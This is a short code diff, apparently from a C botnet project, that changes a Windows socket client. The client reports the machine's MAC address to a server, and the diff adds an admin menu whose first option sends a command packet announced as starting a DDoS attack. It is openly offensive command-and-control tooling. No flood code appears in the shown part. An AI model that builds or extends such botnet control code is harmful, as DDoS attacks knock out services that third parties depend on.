@@ -8,6 +8,9 @@
 #include "conn.h"
 #include "../process/system.h"
 #include "../stdlib/packet.h"
+#include "admin.h"
+
+#include "../stdlib/packet_defs.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -39,7 +42,7 @@ int connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
     char buffer[BUFFER_SIZE];
     int bytes_received;
 
-    printf("\033[32mConnection...\033[0m\n\n");
+    printf("\n\033[32mConnection...\033[0m\n");
 
     if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
         return 1;
@@ -63,13 +66,32 @@ int connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
         return 1;
     }
 
-    printf("Connect to server %s:%d success!\n", SERVER_ADDR, SERVER_PORT);
-
     uint8_t mac[6];
     get_mac_address(mac);
 
     if (hello_packet(sock, mac) < 0) {
         printf("Failed to hello send packet\n");
+    }
+
+    printf("\033[32mConnect to server %s:%d success!\033[0m\n", SERVER_ADDR, SERVER_PORT);
+
+    uint8_t action = input(sock);
+    switch (action) {
+        case 1:
+            printf("Sending a packet at the beginning of a DDoS attack...\n");
+            if (command_packet(sock, ADMIN_PACKET_CTYPE_COMMAND_DDOS, NULL) < 0) {
+                printf("Failed to command ddos send packet\n");
+            }
+        case 2:
+            break;
+        case 3:
+            break;
+        case 4:
+            break;
+        case 5:
+            break;
+        default:
+            break;
     }
 
     while (1) {
